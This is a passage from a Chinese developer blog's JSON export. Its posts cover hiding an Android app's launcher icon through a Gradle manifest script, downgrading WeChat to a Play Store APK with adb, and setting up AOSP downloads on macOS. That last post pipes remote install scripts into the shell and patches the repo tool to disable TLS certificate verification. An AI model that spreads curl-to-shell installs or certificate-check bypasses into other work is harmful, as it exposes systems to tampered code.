class=\"comment\">&lt;!--在入口Activity添加如下data节点即可隐藏桌面图标--&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">data</span> </span></span><br><span class=\"line\"><span class=\"tag\">                    <span class=\"attr\">android:host</span>=<span class=\"string\">&quot;localhost&quot;</span> </span></span><br><span class=\"line\"><span class=\"tag\">                    <span class=\"attr\">android:scheme</span>=<span class=\"string\">&quot;$&#123;applicationId&#125;&quot;</span> /&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">activity</span>&gt;</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>然后平时我们开发过程中，如果新增了一些四大组件，2个文件都要同时增加，而区别却只有入口Activity。我们想要的是release版本的manifest是自动生成的（在生成时插入那个data节点），平时只需要开发改动debug版本的文件即可。</p>\n<p>主要思路比较简单：</p>\n<ol>\n<li>通过Groovy的XML解析库读取debug的manifest文件，遍历节点找到入口Activity；</li>\n<li>将data节点插入到入口Activity下面；</li>\n<li>把新的内容写入release版本的文件当中。</li>\n</ol>\n<p>先直接看build.gradle脚本源码：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> groovy.xml.XmlUtil</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> getManifestPath(buildType) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;$&#123;projectDir&#125;/src/main/$buildType/AndroidManifest.xml&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> handleManifestXml(manifest) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (gradle.startParameter.taskNames.contains(<span class=\"string\">&quot;:app:assembleDebug&quot;</span>)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// debug build</span></span><br><span class=\"line\">        <span class=\"keyword\">def</span> debugPath = getManifestPath(<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">        manifest.srcFile debugPath</span><br><span class=\"line\">        println(<span class=\"string\">&quot;Manifest path: $debugPath&quot;</span>)</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// release build</span></span><br><span class=\"line\">        <span class=\"keyword\">def</span> releasePath = getManifestPath(<span class=\"string\">&#x27;release&#x27;</span>)</span><br><span class=\"line\">        println(<span class=\"string\">&quot;Manifest path: $releasePath&quot;</span>)</span><br><span class=\"line\">        manifest.srcFile releasePath</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">def</span> debugPath = getManifestPath(<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">def</span> debugFile = <span class=\"keyword\">new</span> File(debugPath)</span><br><span class=\"line\">        <span class=\"keyword\">def</span> releaseFile = <span class=\"keyword\">new</span> File(releasePath)</span><br><span class=\"line\">        <span class=\"keyword\">def</span> debugXml = <span class=\"keyword\">new</span> XmlParser(<span class=\"literal\">false</span>, <span class=\"literal\">false</span>).parse(debugFile)</span><br><span class=\"line\">        <span class=\"comment\">// 修改debug的manifest，自动生成release版本</span></span><br><span class=\"line\">        debugXml.application[<span class=\"number\">0</span>].each &#123; comp -&gt;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (comp.name() == <span class=\"string\">&#x27;activity&#x27;</span>) &#123;</span><br><span class=\"line\">                comp.each &#123; filter -&gt;</span><br><span class=\"line\">                    <span class=\"comment\">// 搜索入口Activity</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (filter.toString().contains(<span class=\"string\">&#x27;android.intent.category.LAUNCHER&#x27;</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 添加data节点，隐藏桌面icon</span></span><br><span class=\"line\">                        filter.appendNode(<span class=\"string\">&#x27;data&#x27;</span>, [<span class=\"string\">&#x27;android:host&#x27;</span>: <span class=\"string\">&#x27;localhost&#x27;</span>, <span class=\"string\">&#x27;android:scheme&#x27;</span>: <span class=\"string\">&#x27;$&#123;applicationId&#125;&#x27;</span>])</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">true</span> <span class=\"comment\">// break each闭包</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        releaseFile.write(XmlUtil.serialize(debugXml))</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">android &#123;</span><br><span class=\"line\">    defaultConfig &#123;</span><br><span class=\"line\">        applicationId <span class=\"string\">&quot;com.xxx.xxx&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sourceSets &#123;</span><br><span class=\"line\">        main &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 此处会自动处理manifest文件</span></span><br><span class=\"line\">            <span class=\"comment\">// 注意：平时开发时只需修改debug下的manifest即可，请勿手动修改release的</span></span><br><span class=\"line\">            handleManifestXml(manifest)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>关键逻辑从 <code>def debugXml = new XmlParser(false, false).parse(debugFile)</code> 开始，这里的XmlParser构造方法可以不传任何参数，我这里传false主要是为了让manifest根节点自动添加 <strong>xmlns</strong> ，这样最后生成文件内容会简洁一点。</p>\n<p>然后就是 <code>debugXml.application[0].each &#123; comp -&gt; ... &#125; </code> 循环块，Groovy的语法很神奇，这里可以直接通过节点名称来获取数组，比如application，取0当然就是第一个，一般我们的manifest里就一个application节点，所以也不会出现空指针异常。each是数组的函数，遍历数组的每一个节点，comp参数是我自定义的命名。能拿到application的子节点，后面就都是一些逻辑处理了，不赘述。</p>\n<h2 id=\"一些小问题\"><a href=\"#一些小问题\" class=\"headerlink\" title=\"一些小问题\"></a>一些小问题</h2><p>如果是Windows开发者，最后写文件时，需要注意换行符和编码的问题。</p>\n<p>1、最后的write方法，加上参数：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">releaseFile.write(xmlStr, <span class=\"string\">&quot;UTF-8&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>或者直接改全局配置，修改整个工程下的gradle.properties文件，在gradle的JVM参数后面追加如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure>\n\n<p>2、换行符问题，没有JVM参数可供修改，只能手动处理，还是最后write时：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">releaseFile.write(XmlUtil.serialize(debugXml).replaceAll(<span class=\"string\">&#x27;\\r\\n&#x27;</span>, <span class=\"string\">&#x27;\\n&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>这里XmlUtil工具类的serialize方法返回类型实际上就是String，所以可以这样直接replace。</p>\n"},{"layout":"post","title":"覆盖安装Play Store版本的国产App","subtitle":"探索发现。","date":"2020-06-05T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 前言\n\n对于Android平台，如果在国内应用商店安装诸如微信、支付宝等国产大型App，相比去Google Play Store安装，会多要不少权限，即便权限无差异，在隐私政策等规则方面，Play Store也会更严格一些，能上架的应用肯定不敢乱搞。之前也有不少用户反映在Play Store安装的微信要流畅不少，某些功能细节也会有差异。\n\n不过由于严格的审核机制，Play Store上的国产App更新频率普遍落后于国内应用商店，如果我们已经安装了国内的最新版本，正常情况下就没办法覆盖安装低版本了。Play Store上也会显示已安装，没有重新安装这种选项。可我们想在**不卸载原有版本且保留数据**的情况下覆盖安装Play Store上的版本，该怎么办呢？\n\n下文以微信为例。\n\n## 方案\n\n第一种方法很简单，比如我现在装了国内应用商店上的微信，版本为7.0.14，那我可以等着Play Store上架7.0.15版本的微信后直接升级，自然就替换成了Play Store版本的微信。\n\n第二种方法，拒绝等待。我们可以将Play Store上的微信下载下来，手动安装。但是，Play Store是没有提供Apk官方下载途径的，所以我们要去 [https://apkpure.com](https://apkpure.com) （专门提取官方Apk的网站）搜索WeChat即可，注意要下载Apk文件，不要下XAPK格式：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2020060612375117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n由于Play Store上目前最新版本低于我手机上的微信版本，直接copy到手机上手动安装会失败的，低版本不能覆盖高版本。所以，接下来我们需要通过adb命令来安装Apk了（在这之前请保证手机的开发者选项是打开状态且开启了其中的USB调试和USB安装）：\n\n```bash\nadb install -r -d WeChat_v7.0.13_apkpure.com.apk\n```\n\n`-r` 参数表示覆盖安装且保留数据，这对我们非常重要，微信几个GB的数据不是说清就能清的，要命。`-d` 参数表示强制将低版本覆盖安装到现有版本上，无论现有高低。\n\n## 后话\n\n安装后我发现小程序打不开了，提示模块正在更新中，但是过了半天都没反应（结果是我忘了使用科学上网，如果网络正常，小程序模块就会在后台通过谷歌服务来安装）。这证明了，Play Store版本的微信，默认不会自带小程序等额外模块，而是通过谷歌商店来更新的（可能是App Bundle），因为谷歌是不允许自己搞热更新的，所以微信的热更新自然就去掉了。\n\n另外，我发现Play Store上的微信会使用系统的WebView内核（也就是Chrome那一套），公众号和小程序的使用体验流畅了很多很多，非常爽。当然，你也可以通过给自己发送debugtbs.qq.com网址并使用微信内置浏览器打开，然后手动关闭X5内核。\n\n通过此方法，我把QQ、支付宝等都替换掉了。其中QQ有点奇葩，覆盖成低版本后打不开了，点icon没反应，怀疑可能是兼容问题，清除全部数据才好，看来降级太多个版本的话也会有风险，所以自己斟酌好再搞。但目前看来微信和支付宝是没问题的。至于淘宝，可以下载Play Store上的淘宝Lite，功能简洁，没那么多杂七杂八的，对于非深度用户足够了。\n","source":"_posts/2020-06-06-覆盖安装Play Store版本的国产App.md","raw":"---\nlayout:     post\ntitle:      覆盖安装Play Store版本的国产App\nsubtitle:   探索发现。\ndate:       2020-06-06\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 鼓捣折腾\n    - Android\n---\n\n## 前言\n\n对于Android平台，如果在国内应用商店安装诸如微信、支付宝等国产大型App，相比去Google Play Store安装，会多要不少权限，即便权限无差异，在隐私政策等规则方面，Play Store也会更严格一些，能上架的应用肯定不敢乱搞。之前也有不少用户反映在Play Store安装的微信要流畅不少，某些功能细节也会有差异。\n\n不过由于严格的审核机制，Play Store上的国产App更新频率普遍落后于国内应用商店，如果我们已经安装了国内的最新版本，正常情况下就没办法覆盖安装低版本了。Play Store上也会显示已安装，没有重新安装这种选项。可我们想在**不卸载原有版本且保留数据**的情况下覆盖安装Play Store上的版本，该怎么办呢？\n\n下文以微信为例。\n\n## 方案\n\n第一种方法很简单，比如我现在装了国内应用商店上的微信，版本为7.0.14，那我可以等着Play Store上架7.0.15版本的微信后直接升级，自然就替换成了Play Store版本的微信。\n\n第二种方法，拒绝等待。我们可以将Play Store上的微信下载下来，手动安装。但是，Play Store是没有提供Apk官方下载途径的，所以我们要去 [https://apkpure.com](https://apkpure.com) （专门提取官方Apk的网站）搜索WeChat即可，注意要下载Apk文件，不要下XAPK格式：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2020060612375117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n由于Play Store上目前最新版本低于我手机上的微信版本，直接copy到手机上手动安装会失败的，低版本不能覆盖高版本。所以，接下来我们需要通过adb命令来安装Apk了（在这之前请保证手机的开发者选项是打开状态且开启了其中的USB调试和USB安装）：\n\n```bash\nadb install -r -d WeChat_v7.0.13_apkpure.com.apk\n```\n\n`-r` 参数表示覆盖安装且保留数据，这对我们非常重要，微信几个GB的数据不是说清就能清的，要命。`-d` 参数表示强制将低版本覆盖安装到现有版本上，无论现有高低。\n\n## 后话\n\n安装后我发现小程序打不开了，提示模块正在更新中，但是过了半天都没反应（结果是我忘了使用科学上网，如果网络正常，小程序模块就会在后台通过谷歌服务来安装）。这证明了，Play Store版本的微信，默认不会自带小程序等额外模块，而是通过谷歌商店来更新的（可能是App Bundle），因为谷歌是不允许自己搞热更新的，所以微信的热更新自然就去掉了。\n\n另外，我发现Play Store上的微信会使用系统的WebView内核（也就是Chrome那一套），公众号和小程序的使用体验流畅了很多很多，非常爽。当然，你也可以通过给自己发送debugtbs.qq.com网址并使用微信内置浏览器打开，然后手动关闭X5内核。\n\n通过此方法，我把QQ、支付宝等都替换掉了。其中QQ有点奇葩，覆盖成低版本后打不开了，点icon没反应，怀疑可能是兼容问题，清除全部数据才好，看来降级太多个版本的话也会有风险，所以自己斟酌好再搞。但目前看来微信和支付宝是没问题的。至于淘宝，可以下载Play Store上的淘宝Lite，功能简洁，没那么多杂七杂八的，对于非深度用户足够了。\n","slug":"覆盖安装Play Store版本的国产App","published":1,"updated":"2024-03-25T07:31:25.862Z","comments":1,"photos":[],"link":"","_id":"cluaufh11002rthe6ds88c1kz","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>对于Android平台，如果在国内应用商店安装诸如微信、支付宝等国产大型App，相比去Google Play Store安装，会多要不少权限，即便权限无差异，在隐私政策等规则方面，Play Store也会更严格一些，能上架的应用肯定不敢乱搞。之前也有不少用户反映在Play Store安装的微信要流畅不少，某些功能细节也会有差异。</p>\n<p>不过由于严格的审核机制，Play Store上的国产App更新频率普遍落后于国内应用商店，如果我们已经安装了国内的最新版本，正常情况下就没办法覆盖安装低版本了。Play Store上也会显示已安装，没有重新安装这种选项。可我们想在<strong>不卸载原有版本且保留数据</strong>的情况下覆盖安装Play Store上的版本，该怎么办呢？</p>\n<p>下文以微信为例。</p>\n<h2 id=\"方案\"><a href=\"#方案\" class=\"headerlink\" title=\"方案\"></a>方案</h2><p>第一种方法很简单，比如我现在装了国内应用商店上的微信，版本为7.0.14，那我可以等着Play Store上架7.0.15版本的微信后直接升级，自然就替换成了Play Store版本的微信。</p>\n<p>第二种方法，拒绝等待。我们可以将Play Store上的微信下载下来，手动安装。但是，Play Store是没有提供Apk官方下载途径的，所以我们要去 <a href=\"https://apkpure.com/\">https://apkpure.com</a> （专门提取官方Apk的网站）搜索WeChat即可，注意要下载Apk文件，不要下XAPK格式：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/2020060612375117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>由于Play Store上目前最新版本低于我手机上的微信版本，直接copy到手机上手动安装会失败的，低版本不能覆盖高版本。所以，接下来我们需要通过adb命令来安装Apk了（在这之前请保证手机的开发者选项是打开状态且开启了其中的USB调试和USB安装）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb install -r -d WeChat_v7.0.13_apkpure.com.apk</span><br></pre></td></tr></table></figure>\n\n<p><code>-r</code> 参数表示覆盖安装且保留数据，这对我们非常重要，微信几个GB的数据不是说清就能清的，要命。<code>-d</code> 参数表示强制将低版本覆盖安装到现有版本上，无论现有高低。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>安装后我发现小程序打不开了，提示模块正在更新中，但是过了半天都没反应（结果是我忘了使用科学上网，如果网络正常，小程序模块就会在后台通过谷歌服务来安装）。这证明了，Play Store版本的微信，默认不会自带小程序等额外模块，而是通过谷歌商店来更新的（可能是App Bundle），因为谷歌是不允许自己搞热更新的，所以微信的热更新自然就去掉了。</p>\n<p>另外，我发现Play Store上的微信会使用系统的WebView内核（也就是Chrome那一套），公众号和小程序的使用体验流畅了很多很多，非常爽。当然，你也可以通过给自己发送debugtbs.qq.com网址并使用微信内置浏览器打开，然后手动关闭X5内核。</p>\n<p>通过此方法，我把QQ、支付宝等都替换掉了。其中QQ有点奇葩，覆盖成低版本后打不开了，点icon没反应，怀疑可能是兼容问题，清除全部数据才好，看来降级太多个版本的话也会有风险，所以自己斟酌好再搞。但目前看来微信和支付宝是没问题的。至于淘宝，可以下载Play Store上的淘宝Lite，功能简洁，没那么多杂七杂八的，对于非深度用户足够了。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>对于Android平台，如果在国内应用商店安装诸如微信、支付宝等国产大型App，相比去Google Play Store安装，会多要不少权限，即便权限无差异，在隐私政策等规则方面，Play Store也会更严格一些，能上架的应用肯定不敢乱搞。之前也有不少用户反映在Play Store安装的微信要流畅不少，某些功能细节也会有差异。</p>\n<p>不过由于严格的审核机制，Play Store上的国产App更新频率普遍落后于国内应用商店，如果我们已经安装了国内的最新版本，正常情况下就没办法覆盖安装低版本了。Play Store上也会显示已安装，没有重新安装这种选项。可我们想在<strong>不卸载原有版本且保留数据</strong>的情况下覆盖安装Play Store上的版本，该怎么办呢？</p>\n<p>下文以微信为例。</p>\n<h2 id=\"方案\"><a href=\"#方案\" class=\"headerlink\" title=\"方案\"></a>方案</h2><p>第一种方法很简单，比如我现在装了国内应用商店上的微信，版本为7.0.14，那我可以等着Play Store上架7.0.15版本的微信后直接升级，自然就替换成了Play Store版本的微信。</p>\n<p>第二种方法，拒绝等待。我们可以将Play Store上的微信下载下来，手动安装。但是，Play Store是没有提供Apk官方下载途径的，所以我们要去 <a href=\"https://apkpure.com/\">https://apkpure.com</a> （专门提取官方Apk的网站）搜索WeChat即可，注意要下载Apk文件，不要下XAPK格式：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/2020060612375117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>由于Play Store上目前最新版本低于我手机上的微信版本，直接copy到手机上手动安装会失败的，低版本不能覆盖高版本。所以，接下来我们需要通过adb命令来安装Apk了（在这之前请保证手机的开发者选项是打开状态且开启了其中的USB调试和USB安装）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb install -r -d WeChat_v7.0.13_apkpure.com.apk</span><br></pre></td></tr></table></figure>\n\n<p><code>-r</code> 参数表示覆盖安装且保留数据，这对我们非常重要，微信几个GB的数据不是说清就能清的，要命。<code>-d</code> 参数表示强制将低版本覆盖安装到现有版本上，无论现有高低。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>安装后我发现小程序打不开了，提示模块正在更新中，但是过了半天都没反应（结果是我忘了使用科学上网，如果网络正常，小程序模块就会在后台通过谷歌服务来安装）。这证明了，Play Store版本的微信，默认不会自带小程序等额外模块，而是通过谷歌商店来更新的（可能是App Bundle），因为谷歌是不允许自己搞热更新的，所以微信的热更新自然就去掉了。</p>\n<p>另外，我发现Play Store上的微信会使用系统的WebView内核（也就是Chrome那一套），公众号和小程序的使用体验流畅了很多很多，非常爽。当然，你也可以通过给自己发送debugtbs.qq.com网址并使用微信内置浏览器打开，然后手动关闭X5内核。</p>\n<p>通过此方法，我把QQ、支付宝等都替换掉了。其中QQ有点奇葩，覆盖成低版本后打不开了，点icon没反应，怀疑可能是兼容问题，清除全部数据才好，看来降级太多个版本的话也会有风险，所以自己斟酌好再搞。但目前看来微信和支付宝是没问题的。至于淘宝，可以下载Play Store上的淘宝Lite，功能简洁，没那么多杂七杂八的，对于非深度用户足够了。</p>\n"},{"layout":"post","title":"macOS下载AOSP的小坑","subtitle":"坑也太多了吧。","date":"2020-06-06T16:00:00.000Z","author":"YSY","header-img":"img/archive-bg.jpg","catalog":true,"_content":"\n## 爬坑\n\n以下载Android X源码为例，过程和下载AOSP是一样的，只是分支不同而已。源码在线地址：[frameworks/support](https://cs.android.com/androidx/platform/frameworks/support)\n\n### 安装Homebrew\n\n在Mac上搞开发必须的包管理工具，类似Ubuntu上的apt。安装非常简单，一行命令的事情，来自官网（[Homebrew](https://brew.sh/index_zh-cn)）：\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n```\n\n### 安装repo工具\n\n可以直接下载谷歌官方的repo源码（[https://gerrit.googlesource.com/git-repo](https://gerrit.googlesource.com/git-repo)）然后自己配置命令，但这样很麻烦，直接用brew安装整套Android编译工具：\n\n```bash\nbrew cask install android-platform-tools\n```\n\n装完就可以直接使用repo命令了。\n\n### 下载AOSP源码\n\n详细过程可参考：[Win10用WSL下载AOSP](https://blog.ysy950803.top/2020/05/17/Win10用WSL下载AOSP/)\n\n```bash\n# 创建一个源码目录，命名随意\nmkdir AOSP\ncd AOSP\n# 这里以AndroidX分支示例\nrepo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b androidx-master-dev\nrepo sync -j4\n```\n\n然后报错了：\n\n> fatal: error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1056)\n\n之前在Win10和Ubuntu甚至WSL都没有遇到这个坑。\n\n**解决办法：**\n\n打开repo工具的脚本，如果你是自己下载的git-repo源码那肯定知道在哪里，一般就是 `~/bin/repo` 。当然由于我们刚才是通过brew安装的，所以不在用户目录，直接文本编辑它：\n\n```bash\nsudo open -e /usr/local/bin/repo\n```\n\n在import sys那一行下面加入2行代码后如下：\n\n```python\nimport sys\n\nimport ssl\n\nssl._create_default_https_context = ssl._create_unverified_context\n```\n\n保存后再去repo init就没问题了。这个主要原因是Python 2.7.9后在打开HTTPS链接时加入了SSL验证导致的，然鹅我们并不需要这些，所以上面的代码就是关闭这个。\n\n## 私货\n\n### 让终端默认支持git自动补全\n\n可参考（[https://blog.csdn.net/tiancaijyy/article/details/84888868](https://blog.csdn.net/tiancaijyy/article/details/84888868)）\n\n1、安装bash-completion\n\n```bash\nbrew install bash-completion\n# 成功后查看一下信息\nbrew info bash-comletion\n```\n\n2、在info里可以看到一个 `Add the following line to your ~/.bash_profile:` 提示，让你把下面命令加到你的~/.bash_profile文件中：\n\n```bash\n[[ -r \"/usr/local/etc/profile.d/bash_completion.sh\" ]] && . \"/usr/local/etc/profile.d/bash_completion.sh\"\n```\n\n3、然后请先确定自己的git版本：\n\n```bash\ngit --version\n# 比如我这里输出\ngit version 2.26.2\n```\n\n4、下载git自动完成脚本到bash-completion命令目录下，注意URL中的版本号替换：\n\n```bash\ncurl https://raw.githubusercontent.com/git/git/v2.26.2/contrib/completion/git-completion.bash > /usr/local/opt/bash-completion/etc/bash_completion.d\n```\n\n5、然后使其生效：\n\n```bash\nbrew unlink bash-completion\nbrew link bash-completion\n```\n\n最后重启（要command + Q完全退出）一下终端，再打开就可以自动补全各种命令（当然也包括git）了。\n\n### 推荐安装oh-my-zsh\n\n目前macOS上的终端默认已经是zsh了，而不是bash。推荐安装扩展版本的oh-my-zsh，无论是修改主题还是Tab自动补全都非常方便。安装方法还是很简单，按官方文档（[https://github.com/ohmyzsh/ohmyzsh](https://github.com/ohmyzsh/ohmyzsh)）：\n\n```bash\nsh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n# 或者用wget\nsh -c \"$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n```\n","source":"_posts/2020-06-07-macOS下载AOSP的小坑.md","raw":"---\nlayout:     post\ntitle:      macOS下载AOSP的小坑\nsubtitle:   坑也太多了吧。\ndate:       2020-06-07\nauthor:     YSY\nheader-img: img/archive-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - macOS\n    - AOSP\n---\n\n## 爬坑\n\n以下载Android X源码为例，过程和下载AOSP是一样的，只是分支不同而已。源码在线地址：[frameworks/support](https://cs.android.com/androidx/platform/frameworks/support)\n\n### 安装Homebrew\n\n在Mac上搞开发必须的包管理工具，类似Ubuntu上的apt。安装非常简单，一行命令的事情，来自官网（[Homebrew](https://brew.sh/index_zh-cn)）：\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n```\n\n### 安装repo工具\n\n可以直接下载谷歌官方的repo源码（[https://gerrit.googlesource.com/git-repo](https://gerrit.googlesource.com/git-repo)）然后自己配置命令，但这样很麻烦，直接用brew安装整套Android编译工具：\n\n```bash\nbrew cask install android-platform-tools\n```\n\n装完就可以直接使用repo命令了。\n\n### 下载AOSP源码\n\n详细过程可参考：[Win10用WSL下载AOSP](https://blog.ysy950803.top/2020/05/17/Win10用WSL下载AOSP/)\n\n```bash\n# 创建一个源码目录，命名随意\nmkdir AOSP\ncd AOSP\n# 这里以AndroidX分支示例\nrepo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b androidx-master-dev\nrepo sync -j4\n```\n\n然后报错了：\n\n> fatal: error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1056)\n\n之前在Win10和Ubuntu甚至WSL都没有遇到这个坑。\n\n**解决办法：**\n\n打开repo工具的脚本，如果你是自己下载的git-repo源码那肯定知道在哪里，一般就是 `~/bin/repo` 。当然由于我们刚才是通过brew安装的，所以不在用户目录，直接文本编辑它：\n\n```bash\nsudo open -e /usr/local/bin/repo\n```\n\n在import sys那一行下面加入2行代码后如下：\n\n```python\nimport sys\n\nimport ssl\n\nssl._create_default_https_context = ssl._create_unverified_context\n```\n\n保存后再去repo init就没问题了。这个主要原因是Python 2.7.9后在打开HTTPS链接时加入了SSL验证导致的，然鹅我们并不需要这些，所以上面的代码就是关闭这个。\n\n## 私货\n\n### 让终端默认支持git自动补全\n\n可参考（[https://blog.csdn.net/tiancaijyy/article/details/84888868](https://blog.csdn.net/tiancaijyy/article/details/84888868)）\n\n1、安装bash-completion\n\n```bash\nbrew install bash-completion\n# 成功后查看一下信息\nbrew info bash-comletion\n```\n\n2、在info里可以看到一个 `Add the following line to your ~/.bash_profile:` 提示，让你把下面命令加到你的~/.bash_profile文件中：\n\n```bash\n[[ -r \"/usr/local/etc/profile.d/bash_completion.sh\" ]] && . \"/usr/local/etc/profile.d/bash_completion.sh\"\n```\n\n3、然后请先确定自己的git版本：\n\n```bash\ngit --version\n# 比如我这里输出\ngit version 2.26.2\n```\n\n4、下载git自动完成脚本到bash-completion命令目录下，注意URL中的版本号替换：\n\n```bash\ncurl https://raw.githubusercontent.com/git/git/v2.26.2/contrib/completion/git-completion.bash > /usr/local/opt/bash-completion/etc/bash_completion.d\n```\n\n5、然后使其生效：\n\n```bash\nbrew unlink bash-completion\nbrew link bash-completion\n```\n\n最后重启（要command + 